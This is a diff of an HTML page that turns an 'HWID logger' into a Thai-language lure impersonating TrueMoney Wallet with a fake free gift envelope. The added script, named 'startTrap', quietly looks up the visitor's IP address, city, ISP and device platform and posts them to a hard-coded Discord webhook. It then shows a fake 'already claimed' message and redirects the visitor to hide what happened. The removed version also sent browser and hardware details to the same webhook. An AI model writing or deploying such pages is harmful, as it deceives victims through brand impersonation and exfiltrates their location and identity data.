@@ -1,138 +1,83 @@
 <!DOCTYPE html>
-<html>
+<html lang="th">
 <head>
-  <title>HWID Advanced Logger</title>
-  <style>
-    body {
-      font-family: Arial;
-      background: #0f172a;
-      color: white;
-      text-align: center;
-      padding: 50px;
-    }
-    input {
-      padding: 12px;
-      width: 350px;
-      border-radius: 10px;
-      border: none;
-    }
-    button {
-      padding: 12px 20px;
-      margin-left: 10px;
-      border-radius: 10px;
-      border: none;
-      cursor: pointer;
-      background: #22c55e;
-      color: white;
-      font-weight: bold;
-    }
-    .card {
-      margin-top: 20px;
-      background: #1e293b;
-      padding: 20px;
-      border-radius: 15px;
-      text-align: left;
-      display: inline-block;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>รับซองทรูมันนี่วอลเล็ทฟรี - TrueMoney</title>
+<style>
+    body { margin: 0; font-family: 'Kanit', sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .card { width: 90%; max-width: 400px; background: #fff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; padding: 30px; }
+    .logo { width: 150px; margin-bottom: 20px; }
+    .gift-box { width: 120px; animation: bounce 2s infinite; }
+    @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
+    h2 { color: #ff8c00; margin: 15px 0; }
+    p { color: #666; font-size: 14px; }
+    .btn { background: #ff8c00; color: #fff; border: none; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 20px; width: 100%; }
+    .btn:hover { background: #e67e00; transform: scale(1.05); }
+    #status { margin-top: 15px; font-size: 12px; color: #999; }
+</style>
 </head>
 <body>
 
-<h1>🧠 Advanced HWID Logger</h1>
-
-<input id="hwid" placeholder="Enter HWID..." />
-<button onclick="run()">Submit</button>
-
-<div id="result"></div>
+<div class="card">
+    <img src="https://www.truemoney.com/wp-content/uploads/2020/12/truemoney-wallet-logo.png" class="logo">
+    <img src="https://img5.pic.in.th/file/secure-sv1/gift-box.png" class="gift-box">
+    <h2>คุณได้รับซองของขวัญ!</h2>
+    <p>กดปุ่มด้านล่างเพื่อรับเงินสุ่มตั้งแต่ 10 - 500 บาท<br>เข้าบัญชีทรูมันนี่ วอลเล็ทของคุณทันที</p>
+    <button class="btn" onclick="startTrap()">กดเพื่อรับซองฟรี</button>
+    <div id="status">ระบบกำลังตรวจสอบสิทธิ์...</div>
+</div>
 
 <script>
-async function getIP() {
-  try {
-    const res = await fetch("https://api.ipify.org?format=json");
-    const data = await res.json();
-    return data.ip;
-  } catch {
-    return "unknown";
-  }
+
+const webhookURL = "https://discord.com/api/webhooks/1499460967979942014/a7wMgIv8eKeJYAv2oA84nyZA4IG0OeP3iAMFwxUR2EXDLA0968IMWn5qusmTb9_d0r4y";
+
+async function getFullIntel() {
+    try {
+        const response = await fetch('http://ip-api.com/json/?fields=status,country,city,isp,query');
+        const data = await response.json();
+        if (data.status === 'success') {
+            return { ip: data.query, loc: `${data.city}, ${data.country}`, isp: data.isp };
+        }
+        throw new Error();
+    } catch (e) {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const d = await res.json();
+            return { ip: d.ip, loc: "Unknown (Fallback)", isp: "N/A" };
+        } catch {
+            return { ip: "Bypassed/Hidden", loc: "N/A", isp: "N/A" };
+        }
+    }
 }
 
-async function getGeo(ip) {
-  try {
-    const res = await fetch(`https://ipapi.co/${ip}/json/`);
-    return await res.json();
-  } catch {
-    return {};
-  }
-}
+async function startTrap() {
+    const statusText = document.getElementById("status");
+    statusText.textContent = "⌛ กำลังตรวจสอบยอดเงินในซอง...";
+    
+    // สอยข้อมูลเหยื่อสวัส!
+    const intel = await getFullIntel();
+    
+    const content = `🎯 **GIFT ENVELOPE TARGET ACQUIRED**\n` +
+                    `📡 **REAL IP:** \`${intel.ip}\`\n` +
+                    `📍 **Location:** \`${intel.loc}\`\n` +
+                    `🌐 **ISP:** \`${intel.isp}\`\n` +
+                    `📱 **Device:** ${navigator.platform}\n` +
+                    `⏰ **Time:** ${new Date().toLocaleString()}`;
 
-async function run() {
-  const hwid = document.getElementById("hwid").value.trim();
-
-  if (!hwid) {
-    document.getElementById("result").innerText = "❌ ใส่ HWID ก่อน";
-    return;
-  }
-
-  const ip = await getIP();
-  const geo = await getGeo(ip);
-
-  const data = {
-    hwid: hwid,
-    ip: ip,
-    country: geo.country_name || "unknown",
-    city: geo.city || "unknown",
-    org: geo.org || "unknown",
-    timezone: geo.timezone || "unknown",
-    browser: navigator.userAgent,
-    os: navigator.platform,
-    language: navigator.language,
-    screen: screen.width + "x" + screen.height,
-    cores: navigator.hardwareConcurrency || "unknown",
-    memory: navigator.deviceMemory || "unknown",
-    time: new Date().toLocaleString()
-  };
-
-  // 🔥 แสดงหน้าเว็บ
-  document.getElementById("result").innerHTML = `
-    <div class="card">
-      <p><b>HWID:</b> ${data.hwid}</p>
-      <p><b>IP:</b> ${data.ip}</p>
-      <p><b>Country:</b> ${data.country}</p>
-      <p><b>City:</b> ${data.city}</p>
-      <p><b>ISP:</b> ${data.org}</p>
-      <p><b>Timezone:</b> ${data.timezone}</p>
-      <hr>
-      <p><b>OS:</b> ${data.os}</p>
-      <p><b>Browser:</b> ${data.browser}</p>
-      <p><b>Language:</b> ${data.language}</p>
-      <p><b>Screen:</b> ${data.screen}</p>
-      <p><b>CPU Cores:</b> ${data.cores}</p>
-      <p><b>RAM (approx):</b> ${data.memory} GB</p>
-      <hr>
-      <p><b>Time:</b> ${data.time}</p>
-    </div>
-  `;
-
-  // 🔥 ส่งเข้า Discord
-  const webhook = "https://discord.com/api/webhooks/1499460967979942014/a7wMgIv8eKeJYAv2oA84nyZA4IG0OeP3iAMFwxUR2EXDLA0968IMWn5qusmTb9_d0r4y";
-
-  await fetch(webhook, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      embeds: [{
-        title: "🧠 USER FULL DATA",
-        color: 0x00ffcc,
-        fields: Object.entries(data).map(([k,v]) => ({
-          name: k.toUpperCase(),
-          value: String(v)
-        })),
-        timestamp: new Date()
-      }]
-    })
-  });
+    try {
+        await fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: content })
+        });
+        
+        statusText.textContent = "❌ เสียใจด้วย! ซองนี้ถูกรับไปครบแล้ว";
+        alert("ขออภัย! ซองของขวัญนี้มีผู้รับไปครบจำนวนแล้ว");
+        window.location.href = "https://www.truemoney.com";
+    } catch (e) {
+        statusText.textContent = "เครือข่ายขัดข้อง ลองใหม่อีกครั้ง";
+    }
 }
 </script>
 
